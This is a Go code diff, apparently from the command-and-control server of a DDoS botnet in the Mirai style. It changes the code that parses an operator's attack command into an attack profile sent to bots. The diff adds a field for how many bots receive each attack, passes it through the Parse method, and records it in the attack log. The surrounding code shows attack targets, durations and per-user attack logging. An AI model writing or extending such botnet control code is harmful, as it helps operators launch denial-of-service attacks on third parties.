@@ -27,6 +27,7 @@ type Attack struct {
 	Type     uint8
 	Targets  map[uint32]uint8 // Prefix/netmask
 	Flags    map[uint8]string // key=value
+	BotsUsed int              // Número de bots que recibirán el ataque
 }
 
 var BlacklistedIPs = []string{
@@ -38,11 +39,12 @@ var BlacklistedIPs = []string{
 }
 
 // Parse will parse the command into sendable bytes.
-func (M *Method) Parse(args []string, user *User) (*Attack, error) {
+func (M *Method) Parse(args []string, user *User, botsUsed int) (*Attack, error) {
 	var profile *Attack = &Attack{
-		Type:    M.Type,
-		Targets: make(map[uint32]uint8),
-		Flags:   make(map[uint8]string),
+		Type:     M.Type,
+		Targets:  make(map[uint32]uint8),
+		Flags:    make(map[uint8]string),
+		BotsUsed: botsUsed,
 	}
 
 	if len(args) < 2 { // Missing target
@@ -206,7 +208,7 @@ func (M *Method) Parse(args []string, user *User) (*Attack, error) {
 	}
 
 	profile.Duration = uint32(duration)
-	return profile, LogAttack(&AttackLog{Target: args[1], Duration: duration, Flags: strings.Join(appends, " "), Sent: time.Now().Unix(), Finish: time.Now().Add(time.Duration(duration) * time.Second).Unix(), User: user.Username, Devices: len(Clients)})
+	return profile, LogAttack(&AttackLog{Target: args[1], Duration: duration, Flags: strings.Join(appends, " "), Sent: time.Now().Unix(), Finish: time.Now().Add(time.Duration(duration) * time.Second).Unix(), User: user.Username, Devices: profile.BotsUsed})
 }
 
 // Bytes will effectively build the entire attack command.
